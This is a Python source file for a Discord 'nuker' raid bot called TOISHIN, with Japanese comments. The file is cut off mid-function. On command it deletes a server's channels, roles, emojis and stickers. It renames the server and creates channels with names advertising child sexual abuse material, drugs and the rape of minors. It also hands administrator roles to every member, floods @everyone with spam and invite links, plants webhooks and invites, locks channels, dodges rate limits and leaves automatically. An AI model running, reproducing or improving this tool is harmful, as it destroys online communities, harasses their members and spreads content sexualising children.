# -*- coding: utf-8 -*-
"""
================================================================
  TOISHIN NUKER  -  垢飛ばしツール (discord.py)  MAX 構成
================================================================
  !toishin        ->  通常 (既にヌケ済みなら自動でスキップ実行)
  !toishin full   ->  検知を無視して全部やる
  !nukestate      ->  ヌケ済み判定の確認
  !admin          ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
  !auto / !autoadmin on|off
================================================================
  【再ヌケのスキップ】
    既にヌケ済みと判定した場合、以下を飛ばす
      - チャンネル全削除 / 全作成  → 既存chを再利用
      - ロール全削除 / カオスロール作成 / 全員付与
      - 設定破壊
    連投・招待・Webhook・スレッド・施錠は毎回やる
    再利用時は先に slowmode と権限を解除してから撃つ
    判定材料は「サーバー名 / ADMINロール数 / 生成ch数」の3つ
================================================================
  【レート制御】
    - 全送信はトークンバケツ(既定40/s)を1枚通してから発火
    - Retry-After が BIG_429_SECONDS 以上 or グローバル429 → 全APIを即凍結
    - 明けたらレート半減から段階的に戻す
    - 凍結 RECONNECT_AFTER_FREEZE 回ごとに WebSocket を張り直す
================================================================
  【退出保証】
    - 作業期限 = NUKE_TIMEOUT - LEAVE_RESERVE。期限で強制中断
    - 退出リトライはゲートを通らないので凍結中でも必ず試行される
================================================================
  必要な環境変数: DISCORD_TOKEN
  必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
================================================================
"""

import asyncio
import logging
import os
import random
import re
import time

import aiohttp
import discord
from discord.ext import commands

try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

# ==================== Bot インスタンス (先に作る) ====================
# 以降のどこで @bot.command / bot.http を使っても必ず存在させるため、
# 設定より先にここで生成する。
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    case_insensitive=True,
    max_messages=None,
    allowed_mentions=discord.AllowedMentions(everyone=True, roles=False, users=False),
    activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
    chunk_guilds_at_startup=False,
)

# ============================ 設定 ============================
TOKEN = (
    os.getenv("DISCORD_TOKEN")
    or os.getenv("DISCORD_BOT_TOKEN")
    or os.getenv("BOT_TOKEN")
)

GUILD_NAME        = "12歳児童ポルノ販売中"
SECOND_GUILD_NAME = None        # 2回目の改名 (Noneで無効 / レート制限に注意)

CHANNEL_COUNT        = 100
MESSAGES_PER_CHANNEL = 50

# ---- 破壊フェーズのスイッチ ----
ENABLE_COMMUNITY = True         # 削除前にコミュニティをONにする
NUKE_ROLES       = True         # 既存ロールを全削除
KEEP_ADMIN_ROLES = True         # !admin で作った ADMIN-xx は削除しない
CREATE_ROLES     = 40           # カオス用ロール作成数 (0で無効)
ASSIGN_ROLES     = True         # カオスロールを全員に付与
NUKE_EMOJIS      = True         # 絵文字を全削除
NUKE_STICKERS    = True         # スタンプを全削除
FILL_EMOJIS      = 0            # 埋め草絵文字の作成数 (0で無効 / 上限50)
USE_CATEGORIES   = False        # カテゴリを新規作成しない
CATEGORY_COUNT   = 10           # (USE_CATEGORIES=True のときだけ使用)
CREATE_INVITES   = 50           # 招待生成数 (退出後も残る)
CREATE_WEBHOOKS  = 30           # Webhook生成数
CREATE_THREADS   = 20           # スレッド生成数
SET_NSFW         = False        # 作成chを年齢制限にしない
SET_SLOWMODE     = True         # 送信後に低速モード
SLOWMODE_SECONDS = 21600        # 6時間
DENY_SEND_AFTER  = True         # 送信後に @everyone の送信権限を剥奪
PING_ALL         = True         # デフォルト通知を「全メッセージ」に
VERIF_HIGH       = True         # 認証レベル最高

GUILD_ICON_URL   = None
ADMIN_NOTIFY     = False
ADMIN_ROLE_COUNT = 50
ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与

# ==================== 再ヌケのスキップ ====================
SKIP_IF_NUKED      = True       # ヌケ済みなら削除/作成/付与を飛ばす
MIN_REUSE_CHANNELS = 10         # 再利用chがこれ未満なら通常実行に戻す
DETECT_ADMIN_MIN   = 10         # ADMINロールがこの数以上でヌケ済み
DETECT_CHAOS_MIN   = 10         # 生成chがこの数以上でヌケ済み

# ==================== 送信ペース ====================
SPAM_RATE        = 40.0         # 1秒あたりの送信数 (Discord全体上限は約50/s)
SPAM_BURST       = 15.0         # 瞬間バースト許容量
PER_CHANNEL_SPAM = 2            # 1チャンネル内の同時送信数
SPAM_STAGGER     = 0.08         # チャンネル起動のずらし幅(秒)

# ==================== 429 突破 ====================
BIG_429_SECONDS        = 20.0   # これ以上のRetry-Afterは全体凍結
RATE_MIN               = 10.0   # 凍結後の最低レート
RATE_STEP              = 5.0    # 復帰時に上げる幅
RATE_RAMP_INTERVAL     = 5.0    # 復帰ステップ間隔(秒)
RECONNECT_AFTER_FREEZE = 3      # 凍結この回数ごとに WebSocket 再接続

# ==================== 退出保証 ====================
NUKE_TIMEOUT       = 2400       # 全体の絶対上限(秒)
LEAVE_RESERVE      = 240        # 秒。退出専用枠
PANIC_AFTER_GLOBAL = 10         # グローバル429をこの回数(直近のみ)食らったら中断
GLOBAL_RESET       = 15         # 秒。これ以上429が空いたらカウントを戻す
LEAVE_ATTEMPTS     = 20         # 退出リトライ回数

# ---- 並列度 ----
DELETE_CONCURRENCY = 25
CREATE_CONCURRENCY = 15
ROLE_CONCURRENCY   = 8
MEMBER_CONCURRENCY = 8
EXTRA_CONCURRENCY  = 10

# 送信する本文
NUKE_MESSAGE = (
    "@everyone\n"
    "raid by TOISHIN🤣😂🤪 \n"
    "join now!!!!!!\n"
    "↓↓↓↓↓\n"
    "\n"
    "↓↓↓↓\n"
    "\n"
    "↓↓↓\n"
    "\n"
    "↓↓\n"
    "\n"
    "↓\n"
    "\n"
    "https://discord.gg/EWJCrsGVbg\n"
    "\n"
    "トイ神万歳🙌🙌🙌🙌🙌\n"
    "トイ神はさいつよ永久不滅wwww"
    "Orangestarは神！！！！！！！！"
    "君も蜜柑星人になろう🍊”
    "https://youtube.com/@orangestaras?si=dxTYTJZQzCMDHzoX"
)

TOPIC_TEXT = "raid by TOISHIN / join now → https://discord.gg/ctkp"

NAME_POOL = [
    "児童ポルノ販売中", "12歳児童ポルノ販売中", "無料のマリファナ", "12歳の処女レイプ",
    "コカイン密輸販売中", "ヘロイン常時キメ放題", "覚醒剤打ち放題", "大麻栽培所",
    "合法ハーブ", "ロリコン集会所", "ショタ狩り場", "JSは正義", "JCはもっと正義",
    "14歳と同棲中", "13歳と入籍した", "16歳はもうおばさん", "エロ画像置き場",
    "違法ダウンロード", "著作権無視", "海賊版販売中", "脱税王", "賄賂受付中",
    "闇金業者", "地下カジノ", "ポンジスキーム", "ネズミ講", "無限複製", "草生える",
    "オナニー部屋", "淫夢営業中", "ホモの集い", "メンヘラ養殖場", "童貞卒業式",
    "処女膜売買", "ボッキ列島", "まんこ広場", "ちんぽ神社", "うんこ製造所",
    "ゲロ吐き場", "処女JC監禁調教物",
]

ROLE_NAME_POOL = [
    "管理者", "モデレーター", "神", "運営", "サブ垢", "本垢", "Bot", "Lv100",
    "VIP", "プレミアム", "課金勢", "無課金", "古参", "新参", "荒らし", "養分",
    "常連", "一見", "中の人", "裏方", "実質王", "雑用",
]

EMOJI_POOL = [
    "😂", "🤣", "🤪", "😭", "🥺", "😎", "🤤", "🥴", "💀", "👻", "👽", "🤖",
    "💩", "🔥", "💯", "✨", "🎉", "🍺", "🚬", "💊", "💉", "🌿", "🍁", "🎲",
    "🃏", "🤑", "👑", "⚡", "💥", "🍑", "🍆", "🍌", "🐒", "🦍", "🐔", "🐓",
    "🌊", "🍜", "🍣", "🍩", "🧠", "👶", "🍼", "🚀", "🛸", "🙌", "🤝", "👀",
]

# 絵文字生成用 (twemoji)
TWEMOJI_CODES = [
    "1f600", "1f602", "1f923", "1f60d", "1f970", "1f60e", "1f929", "1f618",
    "1f61c", "1f92a", "1f911", "1f92f", "1f973", "1f97a", "1f914", "1f928",
    "1f60b", "1f61b", "1f92d", "1f917", "1f910", "1f9d0", "1f631", "1f616",
    "1f624", "1f622", "1f62d", "1f626", "1f628", "1f92e", "1f634", "1f637",
    "1f912", "1f915", "1f922", "1f92c", "1f97d", "1f440", "1f4af", "1f525",
]
TWEMOJI_URL = "https://cdn.jsdelivr.net/gh/jdecked/twemoji@latest/assets/72x72/{}.png"

# 生成chの名前パターン (「-012-😂🤣🤪」の形)
CHAOS_NAME_RE = re.compile(r"-\d{3}-.{1,20}$")

# ============================ ログ ============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("TOISHIN")
logging.getLogger("discord").setLevel(logging.WARNING)
logging.getLogger("discord.http").setLevel(logging.WARNING)

# ======================= 状態 =======================
PANIC = {"on": False, "global_429": 0, "last_global": 0.0, "deadline": 0.0}

GATE = asyncio.Event()
GATE.set()
PACER = {"rate": SPAM_RATE, "tokens": SPAM_BURST, "last": time.monotonic()}
COOLDOWN = {"until": 0.0, "task": None, "hits": 0}

NUKE_LOCK = asyncio.Lock()
RETRY = {"delay": 30.0}

AUTO_GRANT: dict[int, list[str]] = {}
AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)

_RETRYABLE_5XX = {500, 502, 503, 504}
_NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}

def _retry_after_of(e) -> float:
    try:
        ra = e.response.headers.get("Retry-After")
        if ra is not None:
            return float(ra)
    except Exception:
        pass
    try:
        return float(getattr(e, "retry_after", 0) or 0)
    except Exception:
        return 0.0

def _is_global(e) -> bool:
    try:
        return e.response.headers.get("X-RateLimit-Global") == "true"
    except Exception:
        return False

def _note_global(e) -> None:
    now = time.monotonic()
    if now - PANIC["last_global"] > GLOBAL_RESET:
        PANIC["global_429"] = 0
    PANIC["global_429"] += 1
    PANIC["last_global"] = now
    log.warning("!!! グローバル429 (%d/%d)",
                PANIC["global_429"], PANIC_AFTER_GLOBAL)

def _calm_down() -> None:
    if PANIC["global_429"] and time.monotonic() - PANIC["last_global"] > GLOBAL_RESET:
        PANIC["global_429"] = 0

# ------------------- 凍結 / 復帰 -------------------
async def _reconnect() -> None:
    try:
        log.warning("=== WebSocket 再接続 ===")
        await bot.reconnect()
    except Exception as e:
        log.warning("再接続失敗: %r", e)

async def _reopen_worker() -> None:
    while True:
        remain = COOLDOWN["until"] - time.monotonic()
        if remain <= 0:
            break
        await asyncio.sleep(min(remain, 1.0))

    await asyncio.sleep(random.uniform(0.4, 1.2))
    GATE.set()
    log.info("=== 凍結解除。再開 (レート %.0f/s) ===", PACER["rate"])

    for _ in range(30):
        if not GATE.is_set():
            return
        if PACER["rate"] >= SPAM_RATE:
            return
        await asyncio.sleep(RATE_RAMP_INTERVAL)
        PACER["rate"] = min(SPAM_RATE, PACER["rate"] + RATE_STEP)
        log.info("      -> レート復帰 %.0f/s", PACER["rate"])

def _freeze(seconds: float) -> None:
    if seconds <= 0:
        return
    target = time.monotonic() + seconds
    if target <= COOLDOWN["until"]:
        return

    COOLDOWN["until"] = target
    GATE.clear()
    PACER["rate"] = max(RATE_MIN, PACER["rate"] * 0.5)
    COOLDOWN["hits"] += 1
    log.warning("=== %.0f 秒 凍結 (全API停止 / レート %.0f/s) ===",
                seconds, PACER["rate"])

    if COOLDOWN["task"] is None or COOLDOWN["task"].done():
        COOLDOWN["task"] = asyncio.create_task(_reopen_worker())

    if COOLDOWN["hits"] % RECONNECT_AFTER_FREEZE == 0:
        asyncio.create_task(_reconnect())

async def acquire_token() -> None:
    while True:
        if not GATE.is_set():
            await GATE.wait()

        now = time.monotonic()
        PACER["tokens"] = min(SPAM_BURST,
                              PACER["tokens"] + (now - PACER["last"]) * PACER["rate"])
        PACER["last"] = now

        if PACER["tokens"] >= 1.0:
            PACER["tokens"] -= 1.0
            return

        await asyncio.sleep(max(0.01, (1.0 - PACER["tokens"]) / PACER["rate"]))

async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
    if PANIC["on"]:
        attempts = min(attempts, 2)

    for n in range(1, attempts + 1):
        try:
            result = await call(*args, **kwargs)
            _calm_down()
            return result
        except discord.NotFound:
            _calm_down()
            return None
        except discord.Forbidden as e:
            if n < 2:
                await asyncio.sleep(0.3 * n)
                continue
            log.warning("403 Forbidden: %s (%s)", label, getattr(e, "text", e))
            return None
        except discord.HTTPException as e:
            if e.status == 429:
                wait = _retry_after_of(e) or 1.0
                is_global = _is_global(e)
                if is_global:
                    _note_global(e)

                if is_global or wait >= BIG_429_SECONDS:
                    _freeze(wait)
                    await GATE.wait()
                else:
                    await asyncio.sleep(min(wait, 5.0) + 0.05)
            elif e.status in _RETRYABLE_5XX:
                await asyncio.sleep(min(2 ** n, 15))
            elif e.status in _NO_RETRY_4XX:
                log.warning("HTTP %s: %s (%s)", e.status, label,
                            getattr(e, "text", ""))
                return None
            else:
                log.warning("HTTP %s: %s (%s)", e.status, label, getattr(e, "text", ""))
                await asyncio.sleep(min(2 ** n, 15))
        except discord.DiscordException as e:
            log.warning("DiscordError: %s (%s)", label, e)
            await asyncio.sleep(min(2 ** n, 15))
        except (asyncio.TimeoutError, OSError):
            await asyncio.sleep(min(2 ** n, 15))
    log.error("リトライ上限で断念: %s", label)
    return None

async def patch_guild(guild: discord.Guild, payload: dict, label: str):
    try:
        return await safe(
            bot.http.request,
            discord.http.Route("PATCH", "/guilds/{guild_id}", guild_id=guild.id),
            json=payload, label=label,
        )
    except Exception as e:
        log.warning("patch_guild 失敗 %s: %r", label, e)
        return None

async def leave_guild(guild: discord.Guild, budget: float = LEAVE_RESERVE) -> bool:
    """ゲートを通さず、凍結中でも必ず試行する"""
    end = time.monotonic() + max(5.0, budget)
    n = 0
    while n < LEAVE_ATTEMPTS and time.monotonic() < end:
        n += 1
        try:
            await guild.leave()
            log.info("=== 退出完了 (%d回目) ===", n)
            return True
        except discord.NotFound:
            log.info("=== 退出済み (NotFound) ===")
            return True
        except discord.HTTPException as e:
            remain = max(0.5, end - time.monotonic())
            if e.status == 429:
                wait = _retry_after_of(e) or min(5.0 * n, 60.0)
                wait = min(wait, remain)
                log.warning("退出が429。%.0f 秒待って再試行 (%d/%d, 残り%.0fs)",
                            wait, n, LEAVE_ATTEMPTS, remain)
                await asyncio.sleep(wait + 0.3)
                continue
            log.warning("退出失敗 HTTP %s (%s)。再試行 (%d/%d)",
                        e.status, getattr(e, "text", ""), n, LEAVE_ATTEMPTS)
            await asyncio.sleep(min(2 ** n, 10, remain))
        except Exception as e:
            log.warning("退出エラー %r。再試行 (%d/%d)", e, n, LEAVE_ATTEMPTS)
            await asyncio.sleep(min(2 ** n, 10))

    try:
        await bot.http.leave_guild(guild.id)
        log.info("=== 退出完了 (直接HTTP) ===")
        return True
    except Exception as e:
        log.error("直接HTTPも失敗: %r", e)

    log.error("=== 退出できなかった (Botを手動で蹴ってください) ===")
    return False

async def fetch_bytes(url: str) -> bytes:
    async with aiohttp.ClientSession() as s:
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            r.raise_for_status()
            return await r.read()

def _suffix(i: int) -> str:
    return f"-{i:03d}-{''.join(random.sample(EMOJI_POOL, 3))}"

def build_channel_names() -> list[str]:
    return [f"{NAME_POOL[(i - 1) % len(NAME_POOL)]}{_suffix(i)}"[:100]
            for i in range(1, CHANNEL_COUNT + 1)]

def build_category_names() -> list[str]:
    return [f"{NAME_POOL[(i * 3) % len(NAME_POOL)]}{_suffix(i)}"[:100]
            for i in range(1, CATEGORY_COUNT + 1)]

def is_admin_role(r: discord.Role) -> bool:
    return r.name.startswith("ADMIN-") and r.permissions.administrator

def panic_skip(stage: str) -> bool:
    if PANIC["on"]:
        log.warning("PANIC: %s をスキップ", stage)
        return True
    return False

def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
    names = AUTO_GRANT.get(guild.id)
    if not names:
        return []
    wanted = set(names)
    return [r for r in guild.roles if r.name in wanted]

# ================== ヌケ済み判定 ==================
def nuked_reasons(guild: discord.Guild) -> list[str]:
    """コミュニティ有効は通常サーバーでも普通なので判定に含めない"""
    hits = []
    if guild.name == GUILD_NAME:
        hits.append("名前")
    if sum(1 for r in guild.roles if is_admin_role(r)) >= DETECT_ADMIN_MIN:
        hits.append("ADMINロール")
    if sum(1 for c in guild.text_channels if CHAOS_NAME_RE.search(c.name)) >= DETECT_CHAOS_MIN:
        hits.append("生成ch")
    return hits

def looks_nuked(guild: discord.Guild) -> bool:
    return bool(nuked_reasons(guild))

def reusable_channels(guild: discord.Guild) -> list[discord.TextChannel]:
    """流用できる通常テキストch (rules / お知らせ は除外)"""
    rules = guild.rules_channel
    news = guild.public_updates_channel
    out = []
    for c in guild.text_channels:
        if c.type is not discord.ChannelType.text:
            continue
        if c is rules or c is news:
            continue
        out.append(c)
    return out

async def unlock_for_spam(guild: discord.Guild,
                          chs: list[discord.TextChannel]) -> None:
    """再利用chを撃てる状態に戻す (低速解除 + 権限を戻す)"""
    sem = asyncio.Semaphore(DELETE_CONCURRENCY)

    async def one(ch):
        async with sem:
            await safe(ch.edit, slowmode_delay=0,
                       reason="TOISHIN NUKE", label=f"unlock:{ch.name}")
            await safe(ch.set_permissions, guild.default_role,
                       view_channel=True, send_messages=True,
                       send_messages_in_threads=True, add_reactions=True,
                       create_public_threads=True, create_private_threads=True,
                       attach_files=True, embed_links=True,
                       use_external_emojis=True,
                       reason="TOISHIN NUKE", label=f"unlockperm:{ch.name}")

    await asyncio.gather(*(one(c) for c in chs))

# ================== コミュニティ有効化 ==================
async def _community_pair(guild: discord.Guild):
    rules = await safe(guild.create_text_channel, "rules",
                       reason="TOISHIN NUKE", label="community:rules")
    if rules is None:
        return None, None

    news = await safe(guild.create_text_channel, "お知らせ-📢",
                      type=discord.ChannelType.news,
                      reason="TOISHIN NUKE", label="community:news")
    if news is None:
        news = await safe(guild.create_text_channel, "お知らせ-📢",
                          reason="TOISHIN NUKE", label="community:news-text")
    return rules, news

async def _community_ok(guild: discord.Guild, how: str) -> bool:
    try:
        await guild.fetch()
    except Exception:
        pass
    if "COMMUNITY" in guild.features:
        log.info("      -> コミュニティON 完了 (%s)", how)
        return True
    log.warning("      -> PATCH は通ったが features に反映されず (%s)", how)
    return False

async def enable_community(guild: discord.Guild) -> bool:
    if "COMMUNITY" in guild.features:
        log.info("      -> 既にコミュニティON。スキップ")
        return True

    try:
        if not any(isinstance(c, discord.TextChannel) for c in guild.channels):
            await safe(guild.create_text_channel, "temp",
                       reason="TOISHIN NUKE", label="community:temp")

        base = sorted(set(guild.features) | {"COMMUNITY"})

        got = await patch_guild(guild, {"features": base}, "community:on#1")
        if got is not None:
            return await _community_ok(guild, "自動生成")

        log.info("      -> features 単体で失敗。ch を添えて再試行")
        rules, news = await _community_pair(guild)
        if rules is not None and news is not None:
            got = await patch_guild(guild, {
                "features": base,
                "rules_channel_id": str(rules.id),
                "public_updates_channel_id": str(news.id),
            }, "community:on#2")
            if got is not None:
                return await _community_ok(guild, "ch添付")

        log.info("      -> ch 添付でも失敗。2FA要件付きで再試行")
        got = await patch_guild(guild, {"features": base, "mfa_level": 1},
                                "community:on#3")
        if got is not None:
            return await _community_ok(guild, "2FA付き")

        log.warning("コミュニティ有効化に失敗。上の HTTP 本文を確認 "
                    "(Manage Server 権限 / 2FA要件 / ch数)")
        return False
    except Exception as e:
        log.warning("コミュニティ有効化で例外: %r", e)
        return False

async def bind_community_channels(guild: discord.Guild,
                                  created: list[discord.TextChannel]) -> None:
    if "COMMUNITY" not in guild.features or not created:
        return

    try:
        rules = created[0]
        news = await safe(guild.create_text_channel, "お知らせ-📢",
                          type=discord.ChannelType.news,
                          topic=TOPIC_TEXT, reason="TOISHIN NUKE", label="news:create")

        payload = {"rules_channel_id": str(rules.id)}
        if news is not None:
            payload["public_updates_channel_id"] = str(news.id)

        await patch_guild(guild, payload, "community:bind")
        log.info("      -> rules / お知らせch を再割当")
    except Exception as e:
        log.warning("rules/お知らせch の再割当に失敗: %r", e)

# ========================= ヌケ本体 =========================
async def _nuke_body(guild: discord.Guild, el, force_full: bool = False) -> None:
    nuked = (not force_full) and SKIP_IF_NUKED and looks_nuked(guild)
    if nuked:
        log.info("=== ヌケ済み判定 (%s)。削除/作成/付与をスキップ ===",
                 ", ".join(nuked_reasons(guild)))
    elif force_full:
        log.info("=== full 指定。スキップなし ===")

    # ---------- 0) コミュニティ有効化 ----------
    if ENABLE_COMMUNITY and "COMMUNITY" not in guild.features \
            and not panic_skip("コミュニティON"):
        log.info("[0/8] コミュニティ有効化 …")
        await enable_community(guild)
        log.info("      -> %s / %s", "ON" if "COMMUNITY" in guild.features else "OFF", el())

    created: list[discord.TextChannel] = []

    # ---------- 1) 再利用 or 全削除 ----------
    if nuked:
        reuse = reusable_channels(guild)
        if len(reuse) >= MIN_REUSE_CHANNELS:
            log.info("[1/8] 既存ch %d 個を再利用。削除/作成スキップ …", len(reuse))
            await unlock_for_spam(guild, reuse)
            created = reuse
            log.info("      -> 再利用準備完了 / %s", el())
        else:
            nuked = False
            log.info("[1/8] 再利用できるchが %d 個しかない。通常実行に切替 …",
                     len(reuse))

    if not nuked and not panic_skip("チャンネル削除"):
        log.info("[1/8] 既存チャンネル全削除 …")
        targets = list(guild.channels)
        normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
        cats   = [c for c in targets if isinstance(c, discord.CategoryChannel)]
        sem_del = asyncio.Semaphore(DELETE_CONCURRENCY)

        async def kill(ch):
            async with sem_del:
                await safe(ch.delete, reason="TOISHIN NUKE", label=f"delete:{ch.name}")

        await asyncio.gather(*(kill(c) for c in normal))
        await asyncio.gather(*(kill(c) for c in cats))
        log.info("      -> 削除完了 %d ch / %s", len(targets), el())

    # ---------- 2) ロール全削除 (スキップ対象) ----------
    if not nuked and NUKE_ROLES and not panic_skip("ロール削除"):
        log.info("[2/8] 既存ロール全削除 …")
        roles, kept = [], []
        for r in guild.roles:
            if r.is_default() or r.managed:
                continue
            if KEEP_ADMIN_ROLES and is_admin_role(r):
                kept.append(r)
                continue
            roles.append(r)

        sem_r = asyncio.Semaphore(ROLE_CONCURRENCY)

        async def kill_role(r):
            async with sem_r:
                await safe(r.delete, reason="TOISHIN NUKE", label=f"roledel:{r.name}")

        await asyncio.gather(*(kill_role(r) for r in roles))
        log.info("      -> ロール削除 %d 個 / ADMIN-xx 温存 %d 個 / %s",
                 len(roles), len(kept), el())
    elif nuked:
        log.info("[2/8] ロール削除スキップ (現状 %d ロール維持)", len(guild.roles))

    # ---------- 3) 絵文字 / スタンプ削除 ----------
    if not panic_skip("絵文字/スタンプ削除"):
        if NUKE_EMOJIS and guild.emojis:
            log.info("[3/8] 絵文字削除 …")
            await asyncio.gather(*(safe(e.delete, reason="TOISHIN NUKE",
                                        label=f"emojidel:{e.name}") for e in guild.emojis))
        if NUKE_STICKERS and guild.stickers:
            log.info("[3/8] スタンプ削除 …")
            await asyncio.gather(*(safe(s.delete, reason="TOISHIN NUKE",
                                        label=f"stickerdel:{s.name}") for s in guild.stickers))
        log.info("      -> 絵文字/スタンプ処理完了 / %s", el())

    # ---------- 4) サーバー設定破壊 ----------
    if not panic_skip("設定破壊"):
        need = (guild.name != GUILD_NAME) or (not nuked)
        if need:
            log.info("[4/8] サーバー設定破壊 …")
            kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
                      "preferred_locale": "ja"}
            if PING_ALL:
                kwargs["default_notifications"] = discord.NotificationLevel.all_messages
            if VERIF_HIGH:
                kwargs["verification_level"] = discord.VerificationLevel.highest
                kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
            if GUILD_ICON_URL:
                try:
                    kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
                except Exception:
                    log.warning("アイコン取得失敗 -> 名前だけ変更")
            await safe(guild.edit, label="guild:edit", **kwargs)
            log.info("      -> 設定破壊完了 / %s", el())
        else:
            log.info("[4/8] 設定は既に破壊済み。スキップ")

    # ---------- 5) カテゴリ作成 ----------
    cat_list: list[discord.CategoryChannel] = []
    if USE_CATEGORIES and not nuked and not panic_skip("カテゴリ作成"):
        log.info("[5/8] カテゴリ %d 個作成 …", CATEGORY_COUNT)
        sem_c = asyncio.Semaphore(EXTRA_CONCURRENCY)

        async def make_cat(nm):
            async with sem_c:
                return await safe(guild.create_category, nm,
                                  reason="TOISHIN NUKE", label=f"cat:{nm}")

        cat_list = [c for c in await asyncio.gather(
            *(make_cat(n) for n in build_category_names())) if c]
        log.info("      -> カテゴリ %d 個 / %s", len(cat_list), el())

    # ---------- 6) チャンネル作成 (スキップ対象) ----------
    if not nuked and not panic_skip("チャンネル作成"):
        log.info("[6/8] チャンネル %d 個作成 …", CHANNEL_COUNT)
        names = build_channel_names()
        sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)

        async def make(i: int, nm: str):
            cat = cat_list[i % len(cat_list)] if cat_list else None
            async with sem_new:
                return await safe(
                    guild.create_text_channel, nm,
                    category=cat, topic=TOPIC_TEXT,
                    nsfw=SET_NSFW, reason="TOISHIN NUKE", label=f"create:{nm}",
                )

        created = [c for c in await asyncio.gather(
            *(make(i, n) for i, n in enumerate(names))) if c]
        log.info("      -> 作成完了 %d ch / %s", len(created), el())

        if ENABLE_COMMUNITY and created and not PANIC["on"]:
            await bind_community_channels(guild, created)

    # ---------- 7) 招待 / Webhook / スレッド ----------
    pool = created or list(guild.text_channels)
    if pool and not panic_skip("招待/Webhook/スレッド"):
        sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)

        async def mk_invite(i: int):
            ch = pool[i % len(pool)]
            async with sem_x:
                await safe(ch.create_invite, max_age=0, max_uses=0, unique=True,
                           reason="TOISHIN NUKE", label=f"invite:{ch.name}")

        async def mk_hook(i: int):
            ch = pool[i % len(pool)]
            async with sem_x:
                await safe(ch.create_webhook, name=f"TOISHIN-{i:02d}",
                           reason="TOISHIN NUKE", label=f"hook:{ch.name}")

        async def mk_thread(i: int):
            ch = pool[i % len(pool)]
            async with sem_x:
                await safe(ch.create_thread, name=f"raid-{i:02d}",
                           type=discord.ChannelType.public_thread,
                           reason="TOISHIN NUKE", label=f"thread:{ch.name}")

        log.info("[7/8] 招待 %d / Webhook %d / スレッド %d …",
                 CREATE_INVITES, CREATE_WEBHOOKS, CREATE_THREADS)
        await asyncio.gather(
            *(mk_invite(i) for i in range(CREATE_INVITES)),
            *(mk_hook(i) for i in range(CREATE_WEBHOOKS)),
            *(mk_thread(i) for i in range(CREATE_THREADS)),
        )
        log.info("      -> 生成完了 / %s", el())

    # ---------- 8) カオスロール作成 + 全員付与 (スキップ対象) ----------
    async def chaos_roles():
        if not CREATE_ROLES or PANIC["on"]:
            return
        room = max(0, 240 - len(guild.roles))
        n = min(CREATE_ROLES, room)
        if n <= 0:
            log.warning("ロール枠が無いのでカオスロール作成スキップ")
            return
        sem_cr = asyncio.Semaphore(ROLE_CONCURRENCY)

        async def mk_role(i: int):
            nm = f"{random.choice(ROLE_NAME_POOL)}-{i:02d}"
            async with sem_cr:
                return await safe(
                    guild.create_role, name=nm,
                    colour=discord.Colour.random(), hoist=True,
                    permissions=discord.Permissions(administrator=(i % 3 == 0)),
                    reason="TOISHIN NUKE", label=f"role:{nm}",
                )

        made = [r for r in await asyncio.gather(*(mk_role(i) for i in range(1, n + 1))) if r]
        log.info("      -> カオスロール %d 個作成 / %s", len(made), el())

        if ASSIGN_ROLES and made and not PANIC["on"]:
            members = await collect_members(guild)
            log.info("      -> 付与対象 %d 人", len(members))
            sem_m = asyncio.Semaphore(MEMBER_CONCURRENCY)

            async def give(m: discord.Member):
                if m.bot:
                    return
                need = [r for r in made if r not in m.roles]
                if not need:
                    return
                async with sem_m:
                    await safe(m.add_roles, *need, atomic=True,
                               reason="TOISHIN NUKE", label=f"grant:{m}")

            await asyncio.gather(*(give(m) for m in members))
            log.info("      -> ロール付与完了 / %s", el())

    # ---------- 9) 連投 (ロール作業と並行) ----------
    if created and not panic_skip("連投"):
        log.info("[8/8] %d msg x %d ch 送信 (ch内%d / 間隔%.2fs / %.0f token/s) …",
                 MESSAGES_PER_CHANNEL, len(created), PER_CHANNEL_SPAM,
                 SPAM_STAGGER, SPAM_RATE)

        async def send_one(ch: discord.TextChannel):
            await acquire_token()
            return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")

        async def spam(ch: discord.TextChannel):
            sem = asyncio.Semaphore(PER_CHANNEL_SPAM)

            async def inner():
                async with sem:
                    return await send_one(ch)

            await asyncio.gather(*(inner() for _ in range(MESSAGES_PER_CHANNEL)))

        async def launch():
            tasks = []
            for c in created:
                tasks.append(asyncio.create_task(spam(c)))
                if SPAM_STAGGER:
                    await asyncio.sleep(SPAM_STAGGER)
            await asyncio.gather(*tasks)

        if nuked:
            await launch()
        else:
            await asyncio.gather(chaos_roles(), launch())
        log.info("      -> 送信/付与完了 / %s", el())
    elif not nuked:
        await chaos_roles()

    # ---------- 10) 施錠 (低速 + 送信権剥奪) ----------
    if created and not panic_skip("施錠"):
        log.info("[LOCK] 低速モード + 送信権剥奪 …")

        async def lockdown(ch):
            if SET_SLOWMODE:
                await safe(ch.edit, slowmode_delay=SLOWMODE_SECONDS,
                           reason="TOISHIN NUKE", label=f"slow:{ch.name}")
            if DENY_SEND_AFTER:
                await safe(ch.set_permissions, guild.default_role,
                           send_messages=False, send_messages_in_threads=False,
                           add_reactions=False, create_public_threads=False,
                           create_private_threads=False, attach_files=False,
                           embed_links=False, use_external_emojis=False,
                           reason="TOISHIN NUKE", label=f"perm:{ch.name}")

        await asyncio.gather(*(lockdown(c) for c in created))
        log.info("      -> 施錠完了 / %s", el())

    # ---------- 11) 埋め草絵文字 ----------
    if FILL_EMOJIS and not panic_skip("絵文字作成"):
